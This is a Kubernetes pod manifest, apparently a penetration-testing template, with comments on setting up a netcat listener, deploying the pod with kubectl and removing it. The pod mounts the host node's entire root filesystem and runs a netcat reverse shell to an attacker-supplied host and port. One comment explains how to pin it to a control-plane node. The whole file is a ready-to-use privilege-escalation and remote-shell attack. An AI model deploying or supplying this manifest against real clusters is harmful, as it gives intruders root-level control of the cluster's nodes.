###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < hostpath-exec-revshell.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete hostpath-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-revshell-pod
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-revshell-pod
    image: busybox
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  restartPolicy: Always
  volumes:
  - name: noderoot
    hostPath:
      path: /